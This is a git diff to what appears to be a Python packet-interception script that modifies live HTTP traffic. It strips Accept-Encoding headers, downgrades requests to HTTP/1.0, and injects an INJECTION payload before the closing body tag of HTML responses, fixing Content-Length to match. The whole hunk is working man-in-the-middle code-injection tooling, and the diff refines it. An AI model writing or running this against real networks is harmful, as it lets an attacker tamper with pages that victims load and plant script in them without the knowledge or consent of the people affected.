@@ -46,13 +46,16 @@ def process_packet(pkt):
         # If destination port is port 80, most likely a HTTP request, else HTTP response
         if(tcp.dport == 80 and raw_load):
             #print("[+] Request")
+            # Strip reqeuest of any encoding (such as compression)
             raw_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b'', raw_load)
+            # Change the request from HTTP/1.1 to HTTP/1.0 so content gets sent all at once
+            raw_load = raw_load.replace(b"HTTP/1.1", b"HTTP/1.0")
         elif(tcp.sport == 80 and raw_load):
             content_length = re.search(b"(?:Content-Length:\s)(\d*)", raw_load)
             raw_load = raw_load.replace(b"</body>", INJECTION + b"</body>")
             # Recalculate the content length of the HTML page
             if(content_length and b"text/html" in raw_load):
-                print("[+] Attempting to inject code into response payload")
+                #print("[+] Attempting to inject code into response payload")
                 content_length = content_length.group(1)
                 new_content_length = str(int(content_length) + len(INJECTION)).encode()
                 raw_load = raw_load.replace(content_length, new_content_length)
